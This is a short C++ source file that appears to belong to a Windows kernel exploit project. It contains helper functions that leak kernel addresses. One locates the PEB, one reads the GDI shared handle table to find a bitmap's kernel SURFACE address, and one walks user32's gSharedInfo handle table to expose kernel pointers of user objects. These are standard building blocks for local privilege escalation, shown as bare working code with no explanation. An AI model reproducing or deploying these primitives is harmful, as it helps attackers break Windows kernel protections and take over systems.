#include <iostream>

#include "helpers.h"

#include <winternl.h>

typedef __kernel_entry NTSTATUS(NTAPI* NTQUERYINFORMATIONPROCESS)(IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL);

void* getPebAddress() {
	PROCESS_BASIC_INFORMATION basicInfo = { 0 };
	unsigned long returned = 0;
	NTQUERYINFORMATIONPROCESS NtQueryInformationProcess;
	*(FARPROC*)&NtQueryInformationProcess = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
	NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &basicInfo,
		sizeof(PROCESS_BASIC_INFORMATION), &returned);
	return basicInfo.PebBaseAddress;
}

void* leakSurfaceAddress(HBITMAP bmpHandle) {
	unsigned long long peb = (unsigned long long)getPebAddress();
	unsigned long long gdiSharedHandleTable = *(unsigned long long*)(peb + 0xF8);
	unsigned long long entryOffset = ((unsigned int)bmpHandle & 0xFFFF) * 0x18;
	void* kernelAddress = (void*)*(unsigned long long*)(gdiSharedHandleTable + entryOffset);
	return kernelAddress;
}

void* leakUserObjectAddress(void* handle) {
	USER_HANDLE_ENTRY* handleEntry = 0;
	SHAREDINFO* gSharedInfo = (SHAREDINFO*)GetProcAddress(GetModuleHandleA("user32.dll"), "gSharedInfo");
	USER_HANDLE_ENTRY* gHandleTable = gSharedInfo->aheList;
	handleEntry = &gHandleTable[(unsigned long long)handle & 0x000000000000FFFF];
	return handleEntry->pKernel;
}
